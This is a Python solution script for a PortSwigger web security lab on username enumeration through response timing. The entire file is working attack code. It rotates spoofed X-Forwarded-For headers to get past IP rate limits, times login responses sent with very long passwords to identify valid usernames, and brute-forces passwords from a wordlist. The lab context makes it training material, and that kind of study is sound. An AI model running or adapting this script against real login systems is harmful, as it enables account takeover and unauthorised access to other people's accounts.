#!/usr/bin/env python3
# Lab: Username enumeration via response timing
# Lab-Link: <https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-response-timing>
# Difficulty: PRACTITIONER
import datetime
import random
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def login(url, username, password):
    """Atempt to login.
    Return values:
      False on any condition not mentioned below
      2 if response indicates correct username but incorrect password
      3 if response is a redirect
    """
    headers = {'X-Forwarded-For': f'ABC{random.getrandbits(50)}'}
    data = {'username': username, 'password': password}

    r = requests.post(url, headers=headers, data=data, allow_redirects=False, verify=False, proxies=proxies)

    if r.status_code == 302:
        return 3

    if r.elapsed > datetime.timedelta(milliseconds=1000):
        return 2

    return False


def enumerate_username(url, username_filename):
    with open(username_filename, 'r') as infile:
        for line in infile:
            username = line.rstrip()
            if login(url, username, 'X' * 500) == 2:
                return username

    return False


def enumerate_password(url, username, passwords_filename):
    with open(passwords_filename, 'r') as infile:
        for line in infile:
            password = line.rstrip()
            if login(url, username, password) == 3:
                return password
    return False


def verify_login(url, username, password):
    data = {'username': username, 'password': password}
    headers = {'X-Forwarded-For': f'ABC{random.getrandbits(50)}'}
    r = requests.post(url, headers=headers, data=data, verify=False, proxies=proxies)
    if 'Congratulations, you solved the lab!' in r.text:
        return True
    return False


def main():
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Exampe: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    print(f'[ ] Brute force username and password')

    url = f'{host}/login'
    username = enumerate_username(f'{url}', '../candidate_usernames.txt')
    if not username:
        print(f'[-] Failed to enumerate username')
        sys.exit(-2)
    print(f'[+] Found username: {username}')

    password = enumerate_password(f'{url}', username, '../candidate_passwords.txt')
    if not password:
        print(f'[-] Failed to enumerate password')
        sys.exit(-3)
    print(f'[+] Found password: {password}')

    if verify_login(url, username, password):
        print(f'[+] Login successful, lab solved')
    else:
        print(f'[+] Login not successful')


if __name__ == "__main__":
    main()
